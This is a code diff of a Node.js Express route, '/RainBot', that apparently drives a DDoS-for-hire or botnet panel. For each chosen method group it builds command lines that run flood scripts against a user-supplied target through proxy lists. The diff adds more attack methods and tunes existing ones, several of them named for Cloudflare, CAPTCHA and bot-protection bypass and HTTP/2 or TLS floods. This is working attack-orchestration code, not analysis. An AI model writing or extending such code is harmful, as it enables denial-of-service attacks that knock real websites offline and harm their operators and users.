@@ -90,7 +90,7 @@ app.get('/RainBot', (req, res) => {
       `node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`,
       `node methods/rawcaptcha.js ${target} ${time} 5 5 6`,
       `node methods/cf.js ${target} ${time} 50 30`,
-      `node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`,
+      `node methods/browserb.js ${target} ${time} 5 4 6 proxy.txt`,
       `node methods/cfkill.js GET ${target} ${time} 10 100 proxy.txt`
     );
   } else if (methods === 'RAW-HTTP') {
@@ -99,15 +99,16 @@ app.get('/RainBot', (req, res) => {
       `node methods/http-panel.js ${target} ${time}`,
       `node methods/cf.js ${target} ${time} 50 30`,
       `node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`,
-      `node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`,
+      `node methods/browserb.js ${target} ${time} 5 4 6 proxy.txt`,
       `node methods/rawcaptcha.js ${target} ${time} 5 5 6`,
       `node methods/cfkill.js GET ${target} ${time} 10 100 proxy.txt`
     );
   } else if (methods === 'R9') {
     attackCommands.push(
-      `node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`,
+      `node methods/browserb.js ${target} ${time} 5 4 6 proxy.txt`,
       `node methods/rawcaptcha.js ${target} ${time} 5 5 6`,
       `node methods/h2k.js GET ${target} ${time} 16 90 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --authorization Bearer:abc123 --randrate --full --fakebot true --auth`,
+      `node methods/Cloudflare.js ${target} ${time} 19`,
       `node methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`,
       `node methods/kicker.js GET ${target} ${time} 10 100 proxy.txt`,
       `node methods/tls.js ${target} ${time} 19 90 proxy.txt`,
@@ -147,25 +148,43 @@ app.get('/RainBot', (req, res) => {
     );
   } else if (methods === 'R1') {
     attackCommands.push(
-      `node methods/cf.js ${target} ${time} 50 30`,
+      `node methods/cf.js ${target} ${time} 50 20`,
       `node methods/h2blast.js ${target} ${time} 19 8 proxy.txt`,
       `node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`,
-      `node methods/h2-nust ${target} ${time} 15 2 proxy.txt`,
+      `node methods/h2-nust ${target} ${time} 15 9 proxy.txt`,
       `node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`,
       `node methods/uam.js ${target} ${time} 5 4 6`,
       `node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`,
-      `node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`,
+      `node methods/browserb.js ${target} ${time} 5 4 6 proxy.txt`,
+      `node methods/Cloudflare.js ${target} ${time} 19`,
       `node methods/rawcaptcha.js ${target} ${time} 5 5 6`,
       `node methods/h2k.js GET ${target} ${time} 16 90 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --authorization Bearer:abc123 --randrate --full --fakebot true --auth`,
+      `node methods/cibi.js ${target} ${time} 16 9 proxy.txt`,
       `node methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`,
       `node methods/kicker.js GET ${target} ${time} 10 100 proxy.txt`,
       `node methods/tls.js ${target} ${time} 19 90 proxy.txt`,
       `node methods/cfkill.js GET ${target} ${time} 10 100 proxy.txt`,
       `node methods/cfbypass.js GET ${target} ${time} 10 100 proxy.txt`,
       `node methods/h2sz.js ${target} ${time} 10 15 proxy.txt`,
+      `node methods/vhold.js ${target} ${time} 16 2 proxy.txt`,
       `node methods/hh2.js ${target} ${time} 10 15 proxy.txt`,
       `node methods/ball.js ${target} ${time} 8 19 proxy.txt`,
-      `node methods/bypasssaturn.js ${target} ${time} 8 14 proxy.txt`
+      `node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`,
+      `node methods/bypasssaturn.js ${target} ${time} 8 14 proxy.txt`,
+      `node methods/browser.js ${target} ${time} 100 10 proxy.txt`,
+      `node methods/rapidcf.js mode ${time} 20 proxy.txt 9 ${target}`,
+      `node methods/rapidcf.js ${time} 20 proxy.txt 9 ${target}`,
+      `node methods/HDRH2.js ${target} ${time} 10 100 true`,
+      `node methods/H2CA.js ${target} ${time} 100 10 proxy.txt`,
+      `node methods/HTTP-X.js ${target} ${time} 32 8 proxy.txt`,
+      `node methods/novaria.js ${target} ${time} 32 10 proxy.txt`,
+      `node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`,
+      `node methods/JSX.js ${target} ${time} 100 10 proxy.txt`,
+      `node methods/tls2.js ${target} ${time} 100 10 proxy.txt`,
+      `node methods/nflood.js ${target} ${time} 100 proxy.txt 32 bypass`,
+      `node methods/nflood.js ${target} ${time} 100 proxy.txt 32 flood`,
+      `node methods/cfb2.js ${target} ${time} 100`,
+      `node methods/am.js ${target} ${time} 17 100 4`
     );
   }
 
